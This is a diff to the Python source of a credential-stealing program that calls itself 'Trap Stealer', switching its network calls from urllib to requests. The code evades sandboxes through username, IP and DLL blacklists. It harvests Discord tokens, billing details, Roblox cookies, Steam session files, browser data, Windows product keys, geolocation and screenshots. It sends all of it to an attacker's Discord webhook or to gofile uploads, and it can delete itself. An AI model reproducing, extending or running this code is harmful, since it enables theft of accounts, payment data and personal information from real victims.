@@ -14,7 +14,6 @@ import tempfile
 from sys import executable, stderr
 from ctypes import *
 from json import loads, dumps
-from urllib.request import Request, urlopen
 
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
@@ -35,9 +34,9 @@ if Startup == False:
 else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
 requirements = [
+    ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
-
 for module in requirements:
     try: 
         __import__(module[0])
@@ -46,12 +45,12 @@ for module in requirements:
         time.sleep(3)
 
 from Crypto.Cipher import AES
-
+import requests
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
 
-gofileserver = ''
+
     
 def clear_command_prompt():
     if os.name == 'nt':
@@ -69,7 +68,7 @@ def exit_program(reason):
     ctypes.windll.kernel32.ExitProcess(0)
 
 def check_username():
-    blacli = ['geRnzryUBczGR' ,'tset' ,'10resU' ,'esiuoL' ,'rPx1kd7h' ,'XetaP' ,'ekim' ,'sacuL' ,'G3fOFgqS' ,'nosnhoJ yrraH' ,'nxsnPRhCJvB' ,'revres' ,'derf' ,'lzReUEH' ,'ailuJ' ,'8m9v2u3' ,'SsxewVHjNOqP' ,'b9jjwVml' ,'A5PcCmVOujf0w' ,'MSziV8' ,'xyVpOUdmxP' ,'egroeg' ,'nhoJ' ,'asiL' ,'qb5QNloC0lN8' ,'knarF' ,'nhoJ' 'tnuoccAytilitUGADW','TJG1W3' ,'xetap' ,'cramh' ,'ybbA' ,'jgwMfceEk' ,'MWVJBSZQ' ,'HS9HYSI5' ,'XzveFNC0JhDR','MVT']
+    blacli = ['geRnzryUBczGR' ,'tset' ,'10resU' ,'esiuoL' ,'rPx1kd7h' ,'XetaP' ,'ekim' ,'sacuL' ,'G3fOFgqS' ,'nosnhoJ yrraH' ,'nxsnPRhCJvB' ,'revres' ,'derf' ,'lzReUEH' ,'ailuJ' ,'8m9v2u3' ,'SsxewVHjNOqP' ,'b9jjwVml' ,'A5PcCmVOujf0w' ,'MSziV8' ,'xyVpOUdmxP' ,'egroeg' ,'nhoJ' ,'asiL' ,'qb5QNloC0lN8' ,'knarF' ,'nhoJ' 'tnuoccAytilitUGADW','TJG1W3' ,'xetap' ,'cramh' ,'ybbA' ,'jgwMfceEk' ,'MWVJBSZQ' ,'HS9HYSI5' ,'XzveFNC0JhDR']
 
     username = os.getenv("COMPUTERNAME")
 
@@ -98,6 +97,12 @@ def check_windows():
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
         time.sleep(0.5)
 
+def self_delete():
+    try:
+        os.remove(__file__)
+    except Exception as e:
+        pass
+
 def check_ip():
     blacklisted = [
         '822.842.352.43', '311.45.741.48', '64.842.821.32', '441.291.112.29', '432.75.04.291',
@@ -115,9 +120,9 @@ def check_ip():
     ]
     while True:
         try:
-            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-            
-            if ip in blacklisted[::-1]:
+            response = requests.get("https://api.ipify.org")
+            ip_address = response.content.decode()
+            if ip_address in blacklisted[::-1]:
                 exit_program('Blacklisted IP')
             return
         except:
@@ -141,46 +146,37 @@ def check_dll():
         exit_program('Strange dll detected!')
 
 
-
 def webhook_tools():
     try:
         inputmain = input('1 - Spam a Webhook\n2 - Delete Webhook\n')
         if inputmain == '1':
             timetospam = input('Number of messages -> ')
-            data = input('Message ->')
+            data = {'message': 'your_message'}
             url = input('Webhook URL -> ')
 
             for i in range(int(timetospam)):
                 headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-                request = Request(url, headers=headers, data=data.encode('utf-8'))
-                response = urlopen(Request(request))
-
-                if response.getcode() == 200:
+                response = requests.post(url, data=data, headers=headers)
+                if response.status_code == 200:
                     print(f"Message sent successfully")
                 else:
-                    print(f"Failed to send message: {response.getcode()}")
+                    print(f"Failed to send message: {response.status_code}")
 
                 time.sleep(0.2)
 
             print('Ended. Press Any Key to Leave')
         elif inputmain == '2':
             url = input('Webhook URL -> ')
-            request = Request(url, method='DELETE')
-            response = urlopen(Request(request))
-
-            if response.getcode() == 200:
+            response = requests.delete(url)
+            if response.status_code == 200:
                 print('Webhook deleted successfully')
             else:
-                print(f"Failed to delete webhook: {response.getcode()}")
+                print(f"Failed to delete webhook: {response.status_code}")
 
             print('Press any key to quit')
         else:
             print('Wrong input')
             time.sleep(1)
-
-    except Exception as e:
-        print(f"An error occurred while using webhook tools: {e}")
-
 
     except:
         pass
@@ -384,12 +380,13 @@ def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
         try:
             if headers != '':
-                r = urlopen(Request(hook, data=data, headers=headers))
+                r = requests.post(hook, data=data, headers=headers)
+                return r
             else:
-                r = urlopen(Request(hook, data=data))
-            return r
+                r = requests.post(hook, data=data)
+                return r
         except: 
-           pass
+            pass
 
 Desc= 'drocsiD'[::-1]
 Dscptb= 'BTPdrocsiD'[::-1]
@@ -495,60 +492,52 @@ def get_product_name():
     try:return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
     except:return "Couldn't get Product Name"
 PasswCount = 0
-import os
-import socket
-import subprocess
-
 def globalInfo():
-    try:
-        pr = get_product_name()
-        winkey = get_product_key()
-        url = 'nosj/oi.ofnipi//:sptth'[::-1]
-        req = urlopen(url).read().decode().strip()
-        data = req.json()
-        ip = data['ip']
-        loc = data['loc']
-        location = loc.split(',')
-        latitude = location[0]
-        longitude = location[1]
-        username = os.getlogin()
-        country = data['country']
-        country_code = data['country'].lower()
-        region = data['region']
-        city = data['city']
-        postal = data['postal']
-        computer_name = socket.gethostname()
-        cores = os.cpu_count()
-
-        if os.name == 'Linux':
+    pr = get_product_name()
+    winkey = get_product_key()
+    url = 'nosj/oi.ofnipi//:sptth'[::-1]
+    req = requests.get(url)
+    data = req.json()
+    ip = data['ip']
+    loc = data['loc']
+    location = loc.split(',')
+    latitude = location[0]
+    longitude = location[1]
+    username = os.getlogin()
+    country = data['country']
+    country_code = data['country'].lower()
+    region = data['region']
+    city = data['city']
+    postal = data['postal']
+    computer_name = socket.gethostname()
+    cores = os.cpu_count()
+    avss = avs()
+    system = os.name
+    if system == 'Linux':
+        gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
+        if gpu_info:
             try:
-                gpu_info = subprocess.check_output(['lspci', '-i', 'nvidia']).decode().strip()
-                if gpu_info:
-                    gpu = subprocess.check_output(['nvidia-smi', '--query-gpu=gpu_name', '--format=csv,noheader']).decode().strip()
-            except Exception as e:
-                gpu = "ERROR"
-        elif os.name == 'nt':
-            try:
-                gpu_model = subprocess.check_output(['nvidia-smi', '--query-gpu=name', '--format=csv,noheader']).decode().strip()
-                total_memory = subprocess.check_output(['nvidia-smi', '--query-gpu=memory.total', '--format=csv,noheader,nounits']).decode().strip()
-                free_memory = subprocess.check_output(['nvidia-smi', '--query-gpu=memory.free', '--format=csv,noheader,nounits']).decode().strip()
-                used_memory = subprocess.check_output(['nvidia-smi', '--query-gpu=memory.used', '--format=csv,noheader,nounits']).decode().strip()
-                temperature = subprocess.check_output(['nvidia-smi', '--query-gpu=temperature.gpu', '--format=csv,noheader,nounits']).decode().strip()
+                gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
+            except: gpu= "ERROR"
+            
+    elif system == 'nt':
+        try:
+            gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
+            total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read().strip()
+            free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read().strip()
+            used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
+            temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()
 
-                gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
-            except Exception as e:
-                gpu = f"An error occurred: {e}"
+            gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\n\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
 
-        globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : `{gpu}` \n`Latitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avs()}` "
+        except Exception as e:
+            gpu = f"An error occurred"
 
-        if len(globalinfo) > 1750:
-            globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
-
-        return globalinfo
-
-    except Exception as e:
-        return "Error while getting informations"
-
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : ```{gpu}``` \n`Latitude + Longitude  : ```{latitude}, {longitude}```\n Installed antivirus :\n```{avss}``` "
+    if len(globalinfo) > 1750:
+        globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
+        
+    return globalinfo
 
 def antispam():
     file_path = os.path.join(os.getenv("TEMP"), "winlog.txt")
@@ -580,25 +569,21 @@ documents_path = os.path.join(home_dir, 'Documents')
 pictures_path = os.path.join(home_dir, 'Pictures')
 
 
-def change_about_me(token, biotext):
+def change_about_me(token):
     try:
         headers = {
             "Authorization": f"{token}",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
             "Content-Type": "application/json"
         }
-
+        
         data = {
             "bio": biotext
         }
-        data = dumps(data).encode('utf-8')
-
         url = "https://discord.com/api/v9/users/@me/profile"
-        req = urlopen(Request(url, data=data, headers=headers, method='PATCH'))
-        with Request.urlopen(req) as response:
-            result = response.read()
-    except Exception as e:
-        print(f"Error: {e}")
+        response = requests.patch(url, headers=headers, json=data)
+    except:
+        pass
 
 badgeList =  [
         {"Name": 'Active_Developer','Value': 4194304,'Emoji': '<:active:1045283132796063794> '},
@@ -655,6 +640,8 @@ def getaut(path, arg):
         writeforfile(atfi, 'autofill')
 
 
+import requests
+
 def uhqguild(token):
     try:
         uuuhq = []
@@ -663,13 +650,15 @@ def uhqguild(token):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
         }
 
-        gds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers))).read().decode()
+        response = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
+        gds = response.json()
 
         for gdss in gds:
             if gdss["approximate_member_count"] < 30 or not (gdss["owner"] or gdss["permissions"] == "4398046511103"):
                 continue
             
-            invites = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{gdss['id']}/invites", headers=headers))).read().decode()
+            request = requests.get(f"https://discord.com/api/v6/guilds/{gdss['id']}/invites", headers=headers)
+            invites = request.json()
 
             nins = invites[0]['code'] if invites else None
 
@@ -687,7 +676,7 @@ def get_uhq_friends(tokq, max_friends=5):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     try:
-        response = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers))).read().decode().strip()
+        response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
         friendlist = response.json()
     except:
         return False
@@ -726,7 +715,7 @@ def get_tokq_info(tokq):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    response = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))).read().decode()
+    response = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers)
     user_info = response.json()
 
     username = user_info["username"]
@@ -778,7 +767,7 @@ def checkTokq(Tokq):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     try:
-        a = loads(urlopen(Request("https://discord.com/api/v6/users/@me", headers=headers))).read().decode()
+        a = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
         if a.status_code == 401: 
             return False
         else:
@@ -793,16 +782,13 @@ def GetBilling(Tokq):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     try:
-        url = "https://discord.com/api/users/@me/billing/payment-sources"
-        req = Request(url, headers=headers)
-        with urlopen(req) as response:
+        with requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=headers) as response:
             billing_json = loads(response.read().decode())
     except:
         return False
     
     if not billing_json:
         return " -"
-    
     billing = ""
     for method in billing_json:
         if not method["invalid"]:
@@ -835,13 +821,11 @@ def get_discord_connections(tokq):
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
     }
+    response = requests.get("https://discord.com/api/v6/users/@me/connections", headers=headers)
 
-    url = "https://discord.com/api/v6/users/@me/connections"
+    if response.status_code == 200:
+        data = response.json() 
 
-    try:
-        req = Request(url, headers=headers)
-        with urlopen(req) as response:
-            data = loads(response.read().decode())
         Services = {
             "battlenet": "https://battle.net",
             "ebay": "https://ebay.com",
@@ -869,7 +853,7 @@ def get_discord_connections(tokq):
             connections_list.append(f"☂️ Username : `{connection['name']}`\n🌐 Services : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")
 
         return connections_list
-    except:
+    else:
         return []
 processed_id = []
 def uploadTokq(Tokq, path):
@@ -996,11 +980,15 @@ def uploadTokq(Tokq, path):
 
 
 
-def upload_file(path):
+def upload_file(file_path):
     try:
-        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
-    except: return False
+        response = requests.post(
+            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
+            files={'file': open(file_path, 'rb')}
+        )
+        return response.json()["data"]["downloadPage"]
+    except Exception as e:
+        return False
     
     
 
@@ -1278,8 +1266,7 @@ def getTokq(path, arg):
                                 if not Tokq in Tokqs:
                                     Tokqs += Tokq
                                     uploadTokq(Tokq, path)
-    except:
-        pass
+    except:pass
 def GetDiscord(path, arg):
     try:
         if not os.path.exists(f"{path}/Local State"): return
@@ -1396,6 +1383,49 @@ def getinfo():
             }
             LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except Exception as e:
+        pass
+
+
+def steam_st():
+    try:
+        steam_path = ""
+        if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
+            steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
+            ssfn = []
+            config = ""
+            for file in os.listdir(steam_path):
+                if file[:4] == "ssfn":
+                    ssfn.append(steam_path+f"\\{file}")
+            def steam(path,path1,steam_session):
+                for root,dirs,file_name in os.walk(path):
+                    for file in file_name:
+                        steam_session.write(root+"\\"+file)
+                for file2 in path1:
+                    steam_session.write(file2)
+            if os.path.exists(steam_path+"\\config"):
+                with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
+                    steam(steam_path+"\\config",ssfn,zp)
+
+                headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    } 
+
+            file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
+            data = {
+                "username": "Trap Stealer",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "content": "Here the Steam Session file"
+            }
+
+            response = requests.post(webhook, files=file, data=data)
+            try:
+
+                os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+
+            except:
+                pass
+    except:
         pass
 
 import concurrent.futures
@@ -1645,52 +1675,33 @@ def ZipThings(path, arg, procc):
 
 def srcs():
     try:
-        if os.name == "nt":
-            image_folder = os.path.join(os.environ["USERPROFILE"], "Pictures")
-            screenshot_path = os.path.join(image_folder, "MyFancyScreenshot.png")
 
-            # Execute the PowerShell script
+        if os.name == "nt":
+            
+            image_folder = os.path.join(os.environ["USERPROFILE"], "Pictures")
             test = b64decode("LUNvbW1hbmQ=").decode('utf8')
             command = [
                 "powershell.exe",
                 f"{test}",
-                f"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width  = $Screen.Width; $Height = $Screen.Height; $Left   = $Screen.Left; $Top    = $Screen.Top; $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('{screenshot_path}')"
+                f"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width  = $Screen.Width; $Height = $Screen.Height; $Left   = $Screen.Left; $Top    = $Screen.Top; $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('{image_folder}\\MyFancyScreenshot.png')"
             ]
-            subprocess.run(command)
+            subprocess.run( '-NoProfile', '-ExecutionPolicy', 'Bypass',command)
+
+            screenshot_path = os.path.join(image_folder, "MyFancyScreenshot.png")
 
             with open(screenshot_path, "rb") as file:
                 file_data = file.read()
-
                 data = {
                     "username": "Trap Stealer",
                     "content": "Screen was successfully taken",
+                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
                 }
-
-                headers = {
-                    "Content-Type": "multipart/form-data",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-                }
-
-                boundary = "---------------------------14737809831466499882746641449"
-                content_type = f"multipart/form-data; boundary={boundary}"
-
-                body = f"--{boundary}\r\n"
-                body += f"Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n{dumps(data)}\r\n"
-                body += f"--{boundary}\r\n"
-                body += f"Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n"
-                body += "Content-Type: application/octet-stream\r\n\r\n"
-                body += file_data
-                body += f"\r\n--{boundary}--"
-
-                url = webhook
-                req = Request(webhook, data=body.encode('utf-8'), headers=headers, method='POST')
-                with urlopen(req) as response:
-                    result = response.read()
+                requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})
 
             os.remove(screenshot_path)
 
         else:
-            pass
+            command = ["import", "-window", "root", img_path]
 
     except Exception as e:
         pass
@@ -1815,7 +1826,8 @@ def frcook():
 def GetAll(UserID: int) -> list:
     try:
         FullList = []
-        Friendslist = loads(urlopen(Request(f'https://friends.roblox.com/v1/users/{UserID}/friends')).read().decode())
+        response = requests.get(f'https://friends.roblox.com/v1/users/{UserID}/friends')
+        Friendslist = loads(response.text)
 
         if 'data' in Friendslist:
             x = 0
@@ -1845,7 +1857,7 @@ def GetRAP(UserID):
     Done = False
     while(Done == False):
         try:
-            response = loads(urlopen(Request(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}")).read().decode())
+            response = requests.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}")
             Items = response.json()
             if((response.json()['nextPageCursor'] == "null") or response.json()['nextPageCursor'] == None):
                 Done = True
@@ -1867,7 +1879,7 @@ def GetRAP(UserID):
 
 def roblox(cookie):
     try:
-        baseinf = loads(urlopen(Request("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie})).read().decode())
+        baseinf = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}).json()
         username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]
         
         friendlist = GetAll(userId)
@@ -1882,7 +1894,7 @@ def roblox(cookie):
         else:
             premium = '❌'
 
-        advancedInfo = loads(urlopen(Request(f"https://users.roblox.com/v1/users/{userId}")).read().decode())
+        advancedInfo = requests.get(f"https://users.roblox.com/v1/users/{userId}").json()
         description = 'No Description'
         if advancedInfo["description"]:
             description = advancedInfo["description"]
@@ -2027,6 +2039,9 @@ def getCook(path, arg):
         writeforfile(Cookies, 'cook')
     except:
         pass
+    
+
+            
 def GatherZips(paths1, paths2, paths3):
     thttht = []
     for patt in paths1:
@@ -2043,51 +2058,47 @@ def GatherZips(paths1, paths2, paths3):
     a.start()
     thttht.append(a)
 
-    for thread in thttht:
+    for thread in thttht: 
         thread.join()
-
     global wltZip, GamingZip, OtherZip
-    wals, game, otth = "", '', ''
+    wals, game, otth = "",'',''
     azz = 'stellaW'
-
     if len(wltZip) != 0:
+        
         wals = f":coin:  •  {azz[::-1]}\n"
         for i in wltZip:
             wals += f"└─ [{i[0]}]({i[1]})\n"
-
     if len(GamingZip) != 0:
         game = ":video_game:  •  Gaming:\n"
         for i in GamingZip:
             game += f"└─ [{i[0]}]({i[1]})\n"
-
     if len(OtherZip) != 0:
         otth = ":tickets:  •  Apps\n"
         for i in OtherZip:
             otth += f"└─ [{i[0]}]({i[1]})\n"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
 
-    # Check if any category has content before sending the embed
-    if wals or game or otth:
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }
+    data = {
+        "embeds": [
+            {
+            "title": "Trap Stealer Zips",
+            "description": f"{wals}\n{game}\n{otth}",
+            "color": 0xffb6c1,
+            "footer": {
+                "text": "Trap Stealer ZIP",
+                "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
+            }
+        ],
+        "username": "Trap Stealer",
+        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+        "attachments": []
+    }
+    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
-        data = {
-            "embeds": [
-                {
-                    "title": "Trap Stealer Zips",
-                    "description": f"{wals}\n{game}\n{otth}",
-                    "color": 0xffb6c1,
-                    "footer": {
-                        "text": "Trap Stealer ZIP",
-                        "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
-                }
-            ],
-            "username": "Trap Stealer",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "attachments": []
-        }
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+import os
 
 def dlself(script_path):
     try:
@@ -2274,15 +2285,8 @@ def gatha():
     if crasher == True:
         crashs()
         
-    if melter == True:
+    if melter != False:
         srcss = os.path.realpath(__file__)
         dlself(srcss)
 
-try:
-    response = urlopen("https://api.gofile.io/getServer", timeout=0.5)
-    data = loads(response.read().decode('utf-8'))
-    gofileserver = data.get("data", {}).get("server", "store4")
-except Exception as e:
-    gofileserver = "store4"
-    
 gatha()
